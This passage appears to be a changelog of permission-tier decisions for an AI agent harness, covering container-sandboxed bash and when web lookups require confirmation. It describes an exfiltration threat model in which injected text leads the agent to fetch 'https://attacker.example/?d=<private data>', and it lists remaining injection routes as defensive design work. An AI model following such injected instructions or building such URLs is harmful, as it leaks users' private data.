| `connector-github_GITHUB_GET_AN_ORGANIZATION_VARIABLE` | T1 | T3 |
| `connector-github_GITHUB_GET_A_REPOSITORY_VARIABLE` | T1 | T3 |
| `connector-github_GITHUB_LIST_ENVIRONMENT_VARIABLES` | T1 | T3 |
| `connector-github_GITHUB_LIST_ORGANIZATION_VARIABLES` | T1 | T3 |
| `connector-github_GITHUB_LIST_REPOSITORY_ORGANIZATION_VARIABLES` | T1 | T3 |
| `connector-github_GITHUB_LIST_REPOSITORY_VARIABLES` | T1 | T3 |
| `connector-github_GITHUB_LIST_SELECTED_REPOSITORIES_FOR_AN_ORGANIZATION_VARIABLE` | T1 | T3 |

## 2026-10-23: bash in the container sandbox

| Tool | Arguments | Before | After | Direction |
|---|---|---|---|---|
| `bash` | any | T3 | T2 (runs, then disclosed) | **LESS STRICT** |

Decided by the owner once the container sandbox was hardened: `bash` is offered only with a container sandbox (`sandbox.security.is_host_bash_allowed`), whose writable mounts are the thread's own folders, whose only egress is the registries proxy (`docker/sandbox-egress`: registry.npmjs.org, pypi.org, files.pythonhosted.org; GET/HEAD; 443), whose API takes a per-sandbox key (#98) and which runs under Docker's default seccomp profile (#99). Tools that act outside the sandbox keep their tiers.


## 2026-10-24: web research — outbound tools escalate after a PRIVATE read, not after any content

Owner decision. Before: `web_search`, `web_fetch` and `image_search` were Tier 1 in a clean turn and Tier 3 (`after_content`) once any tool result entered the turn. A plain research request ("find 5 great date-night restaurants in Philly with links") therefore became a confirmation card per lookup as soon as the first search came back.

| Tool | Turn | Before | After | Direction |
|---|---|---|---|---|
| `web_search`, `web_fetch`, `image_search` | nothing read yet | T1 | T1 | unchanged |
| `web_search`, `web_fetch`, `image_search` | only public web results read (search results, fetched pages, image results) | T3 (card, button-only) | T1 | **LESS STRICT** |
| `web_search`, `web_fetch`, `image_search` | a private read returned data earlier in the turn (mail, calendar, Drive, any Composio connector, the ledger's projects/tasks/notes, the person's files, the session watcher, postgres, any MCP server tool, a delegate's or called agent's answer, any tool with no rule) | T3 | T3 | unchanged |
| `web_search`, `web_fetch`, `image_search` | a delegate whose inviting turn had read private data; a run resumed after confirming calls from such a turn | T3 | T3 | unchanged (now explicit: the flag is inherited) |
| `web_search`, `web_fetch`, `image_search` | an automation's (scheduled) turn | T3 | T3 | unchanged: an automation's turn counts as having read private data |
| every other rule with `after_content` | any | as before | as before | unchanged: `after_content` itself is untouched |

### Why

Exfiltration needs two things in one turn: the person's private data in the model's hands, and a channel out. The outbound tools are the channel: an email or a page can tell the agent to fetch `https://attacker.example/?d=<private data>`, and the request is the leak whatever comes back. Untrusted content alone is not enough: a search result or a public page has nothing of the person's to put in a URL. Asking about every lookup after the first search taught approving without reading, which is the failure the tier model exists to prevent.

### How it is decided (data-driven, fail-safe)

* **What counts as a private read** is in the rules file: a rule's `reads_private: false` marks a tool whose result is not the person's data. Seven do: `web_search`, `web_fetch`, `image_search`, `ask_clarification`, `present_files`, `tool_search`, `write_todos`. Every other rule counts as a private read (unlabelled means yes), and so does a tool no rule names, a result whose tool cannot be told, and unreadable rules. `backend/tests/policy/test_web_research.py` pins the public list, so marking another tool public is a visible decision.
* **The outbound set** is read from the rules too: every rule carrying an `after_private_read: true` exception (today the three above).
* **Where it is tracked**: in the policy middleware (`app/policy/middleware.py`, `_private_read`), from the run's own message state by the same walk lineage makes for `after_content` (`app/policy/private_reads.py`): back from the call to the start of the turn (the person's server-tagged message, or a delegate's instruction). Three server-owned facts the walk cannot see are ORed in, each counting as "private" when absent: an automation's turn; for a delegate or @-called agent, its inviting turn (`invited_private_read`, set by the server, stripped from every run request); for a run resumed after a confirmation, the turn its calls were stated in (recorded on each pending action when it is stated). Nothing a run request carries can set or clear them.
* A card stated after a private read is recorded with it, so a rules reload (`supersede`) keeps judging it as stated.
* **A turn that outgrows the context** (added after the live check, same day): summarization replaces the history, the person's tagged message included, so the walk could no longer find the turn's start and failed safe to "private" — a long research turn got cards again. The summary message now carries a server-set record of the summarized part of the current turn (`omniharness_turn_summary`: the turn's start, and the tool behind every folded-in result; carried forward across repeated summaries). The walk ends there and judges those tools as if their results were still in the history. A missing or malformed record, a result whose tool cannot be told, or a summary that never saw the turn's start still counts as private. Run input cannot carry the record (`normalize_input` rebuilds messages from role and content).

### Grouped cards and the resume

When several outbound calls of one turn wait, they are one group (`PendingActionResponse.group`): one card listing each call, with **Apply all** (`POST /api/confirmations/apply-all`, which for outbound cards claims what it can through the one confirmation path, runs them in one batch off the event loop, and resolves a call that raises as FAILED) and **Decline** per call. Once no card of the group is open, the lead resumes the turn on the server (`app/gateway/resume.py`, the #58 Continue machinery: one-shot locks spent only on success) with each call's outcome as a tool result, never the person's turn; the resumed run cannot answer a card.

### Risks that remain

* **The person's own message and context injected into the prompt are not counted as private reads**: if the person pastes private text into their message, or memory or an earlier-turn summary carries it into the system prompt, a lookup in that turn is still Tier 1. A prompt injection in a page read in that turn could make the agent put that text in a URL.
* **Per turn, as decided**: private data read in an EARLIER turn of the same chat is still in the model's context, but does not escalate this turn's lookups.
* **Public reads are still untrusted**: a page can still steer what the agent searches or fetches next in a clean turn (it just has nothing of the person's to send). The UI's zero-click defences (no images or previews from content, defanged links) are unchanged.
* **Scheduled research is still all cards**: an automation's turn counts as private (its prompt can quote calendar or session data), so a research automation waits on cards as before.
* Only lead-proposed outbound cards in a chat resume the turn; a delegate's card still uses Continue <agent>, and other Tier 3 cards still only post their result.
